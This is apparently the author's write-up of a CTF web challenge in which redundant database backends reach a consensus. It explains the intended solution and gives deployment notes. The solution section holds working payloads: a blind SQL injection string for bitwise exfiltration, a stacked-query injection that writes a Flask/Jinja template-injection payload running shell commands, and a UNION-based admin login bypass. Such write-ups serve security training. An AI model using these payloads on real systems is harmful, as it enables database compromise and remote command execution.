# Info
This task is based on an old idea that you can make several redundant versions of the same service to make it difficult to exploit.

We even brought a very similar binary challenge to Belluminar Beijing 2016 (see https://github.com/leetchicken/belluminar/tree/master/100percent).
 
The idea was also developed in a chinese mitigation system called "Cyber Mimic Defense". Its authors even organized a special CTF in Nanjing in May 2018, which we won.

We partially bypassed that mitigation system using timing side channel attack.
Funny part is that this challenge also was prone to such attack, which was unintended (0daysober team used it).

The reason is that initially the stacked queries were not allowed (so that you could not make 'waitfor delay' call), but then I added a second stage with the procedure and had to allow stacked queries =)  

Another alternative part of solution used by 0daysober is to declare your own variable with null-byte to exploit stored procedure and overwrite arbitrary files.

# Solution
Find the following vulnerabilities:
- SQL injection in auth controller
- SQL injection leading to aribtrary files creation in sp_logEvent procedure
- Limited template inclusion in Flask

1) Exfiltrate the source code of sp_logEvent procedure. This can be done by randomized algorithm using the following payload (see exp.py):
```python
payload = '''" or 1=1# $$ or 1=1 -- ' or ascii(substring((%s),%s,1))>%s -- a'''
```
The idea is as follows: MySQL and PostgreSQL return positive result in the query with 50% probability, SQLite always returns false, hence we can manipulate the consensus and exfiltrate 1 bit of information with 25% chance.

2) Exploit fragmented injection in procedure to write arbitrary files, injection exists due to variable truncation to 40 bytes. We'll use SSTI payload to execute arbitrary commands through Flask templates:
```
POST /admin/login/ HTTP/1.1
. . .
username='%3bexec+sp_logEvent+"{{''.__class__.mro()[2].__subclasses__()[231]('type+..\..\\flag*+>+templates/sb-admin/pages/res.html',shell=True)}}",+'../server//////////////////////////////''',+',"../templates/sb-admin/pages/x.html"--+'%3b+--+&password=asd
```
We could also simply overwrite app.py, but Flask won't reload automatically if debug=False.

3) Obtain admin session. We need to repeat the following request several times until the consensus will be on our side:
```
POST /admin/login/ HTTP/1.1
. . .
username=root'+union+select+0,'root','7815696ecbf1c96e6894b779456d330e'+--+&password=asd
```
4) Visit /admin/?page=x and get the flag from /admin/?page=res

# Deployment notes
It is better to deploy this task separately for each team to avoid disturbance.

The outbound connections from the VM are disabled in Windows Firewall (to avoid OOB exploitation), thus you need to specify static IP address.

Task can be started by run.bat, which restores original app.py (just in case) and runs it in loop. We've also put it in autorun.

Flag should be put in a file with unpredictable name (currently flag_with_unpredictable_name_i21uiuaoisdjij.txt in Desktop folder).

I haven't recorded all the steps to properly deploy all the DMBS, it was quite painful =)
